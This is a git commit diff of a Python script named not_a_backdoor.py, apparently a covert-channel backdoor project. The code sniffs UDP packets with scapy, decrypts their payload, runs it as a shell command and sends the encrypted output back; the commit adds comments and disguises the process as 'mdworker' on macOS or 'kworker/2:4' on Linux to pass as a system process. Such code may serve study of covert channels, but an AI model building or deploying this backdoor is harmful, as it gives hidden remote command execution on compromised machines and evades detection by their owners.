52f8e708da726d00a7e7b8cf3f87544581ef8438
Callum Styan <callumstyan@gmail.com>
2015-10-18 17:13:40 -0700

    comments

--- not_a_backdoor.py
+++ not_a_backdoor.py
@@ -7,28 +7,16 @@ import time
 import crypto
 from scapy.all import *
 
-# argument parsing
-parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
-parser.add_argument('-s'
-                   , '--sport'
-                   , dest='sourcePort'
-                   , help='Source port from sender.'
-                   , required=True)
-parser.add_argument('-d'
-                   , '--dport'
-                   , dest='destPort'
-                   , help='Destination port sender is sending to.'
-                   , required=True)
-# parser.add_argument('-i'
-#                    , '--interface'
-#                    , dest='interface'
-#                    , help='Interface to sniff for packets on.')
-args = parser.parse_args()
-sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)
-
+# Function: runCommand
+# Parameters: packet - packet that get passed in from scapy
+#
+# This function is passed to the scapy sniff call, and is called everytime a
+# packet passes the sniff filter.  The function decrypts the raw data at the end
+# of the packet and then runs the command via a subprocess.  The output of the
+# subprocess, even if the command it ran errored out, is then encrypted and sent
+# back to the client.
 def runCommand(packet):
   encryptedData = packet['Raw'].load
-  decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
   data = crypto.decrypt(encryptedData)
   print "Running command " + data
   output = ""
@@ -41,16 +29,35 @@ def runCommand(packet):
   time.sleep(0.1)
   send(packet)
 
-# if
+# Function: setProcessName
+#
+# This function is used to change the process title.  It checks which opert
 def setProcessName():
   operatingSystem = platform.system()
   procName = ""
   if operatingSystem == 'Darwin':
-    procName = "testtest"
+    procName = "mdworker"
   elif operatingSystem == "Linux":
-    procName = "ksomethingorother"
-
+    procName = "kworker/2:4"
+  # set the process title
   setproctitle.setproctitle(procName)
 
+# argument parsing
+parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
+parser.add_argument('-s'
+                   , '--sport'
+                   , dest='sourcePort'
+                   , help='Source port from sender.'
+                   , required=True)
+parser.add_argument('-d'
+                   , '--dport'
+                   , dest='destPort'
+                   , help='Destination port sender is sending to.'
+                   , required=True)
+
+args = parser.parse_args()
+sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)
+
+# main execution
 setProcessName()
 sniff(filter=sniffFilter, prn=runCommand)
